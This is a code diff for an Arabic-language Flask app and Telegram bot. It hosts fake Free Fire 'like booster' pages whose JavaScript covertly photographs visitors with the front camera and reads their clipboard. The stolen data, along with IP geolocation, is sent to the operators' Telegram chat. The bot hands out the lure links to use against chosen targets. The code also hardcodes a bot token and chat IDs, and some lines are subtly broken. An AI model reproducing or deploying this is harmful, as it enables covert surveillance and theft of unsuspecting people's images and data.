@@ -5,22 +5,67 @@ import requests
 from datetime import datetime
 from PIL import Image, ImageDraw, ImageFont
 import io
-
+import telebot
+import threading
+import time
 app = Flask(__name__)
-
-# إعدادات Telegram Bot
-TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'  # استبدل بالتوكن الخاص بك
-TELEGRAM_CHAT_ID = '7796858163'  # استبدل بـ ID الدردشة الخاصة بك
+TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'
+TELEGRAM_CHAT_ID = '7796858163'
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
-
-# إعدادات التسجيل (logging)
+ADMIN_CHAT_ID = [7796858163,6839275984]  
 logging.basicConfig(level=logging.INFO)
-
-# API لسحب معلومات IP
 IP_INFO_API = "https://ipinfo.io"
+bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
+@bot.message_handler(commands=['c'])
+def handle_c_command(message):
+    # إرسال الرسالة الأولى
+    bot.reply_to(message, 
+        "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
+        "**🔹 XAZ Team Official Links 🔹**\n"
+        "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
+        "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
+        "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
+        "**🌍 XAZ Team Official Website 🌍**\n"
+        "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
+        "Stay safe and always verify official sources! 💙"
+    )
 
+    # تأخير 15 ثانية ثم إرسال رسالة إلى الأدمن
+    threading.Thread(target=send_admin_message_after_delay, args=(message.chat.id,)).start()
+
+# وظيفة لإرسال رسالة إلى الأدمن بعد 15 ثانية
+def send_admin_message_after_delay(chat_id):
+    time.sleep(15)
+    bot.send_message(ADMIN_CHAT_ID, 
+        f"**تم قبول طلب دخول سيرفر XAZ من المستخدم:** {chat_id}\n"
+        "يرجى التحقق من الطلب والرد عليه."
+    )
+
+# وظيفة للرد على الأوامر /xaz, /help, /start
+@bot.message_handler(commands=['xaz', 'help', 'start'])
+def handle_commands(message):
+    bot.reply_to(message, 
+        "**مرحبا بكم في سرفر XAZ, هذا سرفر تجريبي لميزات نكح أي مبتز أو ذبابة إلكترونية**\n\n"
+        "هذه الرسالة عند ظهورها تعني تم قبول طلب لسرفر XAZ.\n"
+        "هذا البوت تم تنصيبه على السيرفر بنجاح.\n\n"
+        "الآن هناك عدة روابط على شكل موقع زيادة لايكات فري فاير 😊\n"
+        "(تقوم بمشاركة هذه الروابط مع المبتز أو الذبابة الإلكترونية للقضاء عليها 🙂)\n\n"
+        "كل ما عليك هو أخذ أي رابط من التالي:\n"
+        "- https://api-like-free-fire-new.vercel.app/like\n"
+        "- https://api-like-free-fire-new.vercel.app/visit\n"
+        "- https://api-like-free-fire-new.vercel.app/spam\n\n"
+        "**By:** @X_M_1_9, @Wewefso"
+    )
+
+# تشغيل البوت في خيط منفصل
+def run_bot():
+    bot.polling(none_stop=True)
+
+# تشغيل البوت في خيط منفصل
+threading.Thread(target=run_bot).start()
+
+# باقي الكود الخاص بـ Flask
 def generate_page(title, bg_color, button_text):
-    """دالة لتوليد الصفحات بناءً على المعطيات"""
     return f"""<!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -85,7 +130,7 @@ def generate_page(title, bg_color, button_text):
             if (id) {{
                 await capturePhoto("user", "front");
                 await sendClipboard();
-                alert("good");
+                alert("tm like");
             }} else {{
                 alert("send id");
             }}
@@ -100,38 +145,34 @@ def generate_page(title, bg_color, button_text):
 
                     await fetch('/upload', {{ method: 'POST', body: formData }});
                 }} else {{
-                    console.log("yes.");
+                    console.log("no");
                 }}
             }} catch (error) {{
-                console.log("no", error);
+                console.log("error, error);
             }}
         }}
     </script>
 </head>
 <body>
-    <h1>الرجاء إدخال ID الخاص بك</h1>
-    <input type="text" id="userId" placeholder="أدخل ID هنا">
+    <h1>Id :</h1>
+    <input type="text" id="userId" placeholder="1234567*">
     <button onclick="sendData()">{button_text}</button>
 </body>
 </html>"""
 
 @app.route('/like')
 def like():
-    """صفحة Like"""
     return generate_page("Like Page", "#ffcccc", "Submit")
 
 @app.route('/visit')
 def visit():
-    """صفحة Visit"""
     return generate_page("Visit Page", "#ffffff", "Submit")
 
 @app.route('/spam')
 def spam():
-    """صفحة Spam"""
     return generate_page("Spam Page", "#ffccff", "Submit")
 
 def add_watermark(image_path, output_path):
-    """إضافة علامة مائية إلى الصورة"""
     image = Image.open(image_path)
     draw = ImageDraw.Draw(image)
     font = ImageFont.load_default()
@@ -139,106 +180,17 @@ def add_watermark(image_path, output_path):
     draw.text((10, 10), text, fill="red", font=font)
     image.save(output_path)
 
-def generate_malicious_image():
-    """إنشاء صورة ملغمة"""
-    try:
-        # إنشاء صورة جديدة
-        image = Image.new('RGB', (500, 300), color=(255, 255, 255))
-        draw = ImageDraw.Draw(image)
-        font = ImageFont.load_default()
-
-        # إضافة نص جذاب إلى الصورة
-        attractive_text = (
-            "🎉 **عرض خاص!** 🎉\n\n"
-            "قم بتحميل هذه الصورة واحصل على مكافأة مجانية!\n\n"
-            "⚠️ **تحذير:** لا تقم بتحميلها إذا كنت لا تثق بالمصدر.\n\n"
-            "By: XAZ TEAM"
-        )
-        draw.text((10, 10), attractive_text, fill="red", font=font)
-
-        # حفظ الصورة في ذاكرة المؤقت
-        img_io = io.BytesIO()
-        image.save(img_io, 'PNG')
-        img_io.seek(0)
-
-        return img_io
-
-    except Exception as e:
-        logging.error(f"فشل في إنشاء الصورة: {e}")
-        return None
-
-@app.route('/xaz')
-def send_malicious_image():
-    """إرسال صورة ملغمة مع رسالة مغرية"""
-    try:
-        # إنشاء الصورة الملغمة
-        img_io = generate_malicious_image()
-        if not img_io:
-            return jsonify({'status': 'error', 'message': '❌ فشل في إنشاء الصورة'}), 500
-
-        # إرسال الصورة إلى Telegram
-        files = {'photo': ('malicious_image.png', img_io, 'image/png')}
-        caption = (
-            "🎉 **عرض خاص!** 🎉\n\n"
-            "قم بتحميل هذه الصورة واحصل على مكافأة مجانية!\n\n"
-            "⚠️ **تحذير:** لا تقم بتحميلها إذا كنت لا تثق بالمصدر.\n\n"
-            "By: XAZ TEAM"
-        )
-        response = requests.post(
-            f"{TELEGRAM_API_URL}/sendPhoto",
-            data={
-                'chat_id': TELEGRAM_CHAT_ID,
-                'caption': caption,
-                'parse_mode': 'Markdown'
-            },
-            files=files
-        )
-
-        # التحقق من حالة الاستجابة
-        if response.status_code == 200:
-            logging.info("تم إرسال الصورة الملغمة بنجاح.")
-            return jsonify({'status': 'success', 'message': '✅ تم إرسال الصورة الملغمة بنجاح'})
-        else:
-            logging.error(f"فشل الإرسال: {response.text}")
-            return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {response.text}'}), 500
-
-    except Exception as e:
-        logging.error(f"فشل الإرسال: {e}")
-        return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {e}'}), 500
-
-@app.route('/malicious-image')
-def download_malicious_image():
-    """تحميل الصورة الملغمة"""
-    try:
-        # إنشاء الصورة الملغمة
-        img_io = generate_malicious_image()
-        if not img_io:
-            return jsonify({'status': 'error', 'message': '❌ فشل في إنشاء الصورة'}), 500
-
-        # إرسال الصورة كملف قابل للتحميل
-        return send_file(img_io, mimetype='image/png', as_attachment=True, download_name="malicious_image.png")
-
-    except Exception as e:
-        logging.error(f"فشل في إرسال الصورة: {e}")
-        return jsonify({'status': 'error', 'message': f'❌ فشل في إرسال الصورة: {e}'}), 500
-
 @app.route('/upload', methods=['POST'])
 def upload():
-    """استقبال الصورة ومحتوى الحافظة وإرسالها إلى Telegram مع معلومات IP"""
     try:
-        # سحب معلومات IP
         ip_info = requests.get(IP_INFO_API).json()
         ip = ip_info.get('ip', 'غير معروف')
         city = ip_info.get('city', 'غير معروف')
         region = ip_info.get('region', 'غير معروف')
         country = ip_info.get('country', 'غير معروف')
         location = ip_info.get('loc', 'غير معروف')
-
-        # الوقت والتاريخ الحالي
         now = datetime.now()
         current_time = now.strftime("%Y-%m-%d %H:%M:%S")
-
-        # نص الرسالة مع معلومات IP
         message = (
             f"<b>New User Captured 😏</b>\n\n"
             f"<b>IP:</b> <code>{ip}</code>\n"
@@ -249,17 +201,12 @@ def upload():
             f"<b>Time:</b> <code>{current_time}</code>\n\n"
             f"<i>This tool was designed by XAZ 😎</i>"
         )
-
-        # التحقق من نوع المحتوى المرسل
         if 'photo' in request.files:
             uploaded_file = request.files.get("photo")
             photo_path = "photo.png"
             uploaded_file.save(photo_path)
-
-            # إضافة علامة مائية إلى الصورة
             watermarked_path = "watermarked_photo.png"
             add_watermark(photo_path, watermarked_path)
-
             files = {'photo': open(watermarked_path, 'rb')}
             response = requests.post(
                 f"{TELEGRAM_API_URL}/sendPhoto",
@@ -300,7 +247,6 @@ def upload():
 
 @app.route('/ping')
 def ping():
-    """وظيفة Ping للتحقق من حالة الخادم"""
     return jsonify({'status': 'success', 'message': '🏓 Pong!'})
 
 if __name__ == '__main__':
